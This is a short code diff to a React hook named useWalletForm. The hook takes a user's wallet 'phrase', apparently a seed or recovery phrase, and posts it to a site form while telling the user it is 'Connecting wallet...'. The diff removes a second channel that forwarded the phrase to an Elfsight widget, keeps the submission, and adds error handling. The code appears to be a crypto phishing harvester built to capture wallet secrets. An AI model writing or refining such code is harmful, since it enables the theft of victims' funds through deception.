@@ -34,22 +34,14 @@ export const useWalletForm = (onOpenChange: (open: boolean) => void) => {
       formData.append('form-name', 'wallet-connection');
       formData.append('phrase', phrase);
 
-      await fetch('/', {
+      const response = await fetch('/', {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams(formData as any).toString(),
       });
 
-      const elfsightWidget = document.querySelector('.elfsight-app-12811523-8e4d-48e3-a10d-87d1ae6620a0');
-      if (elfsightWidget) {
-        const event = new CustomEvent('elfsight-app-submit', {
-          detail: {
-            formData: {
-              phrase: phrase
-            }
-          }
-        });
-        elfsightWidget.dispatchEvent(event);
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
       }
 
       console.log("Connecting wallet...");
@@ -62,9 +54,10 @@ export const useWalletForm = (onOpenChange: (open: boolean) => void) => {
       setPhrase("");
       onOpenChange(false);
     } catch (error) {
+      console.error('Form submission error:', error);
       toast({
         title: "Error",
-        description: "Something went wrong. Please try again.",
+        description: "Unable to connect wallet at this time. Please try again later.",
         variant: "destructive",
       });
     } finally {
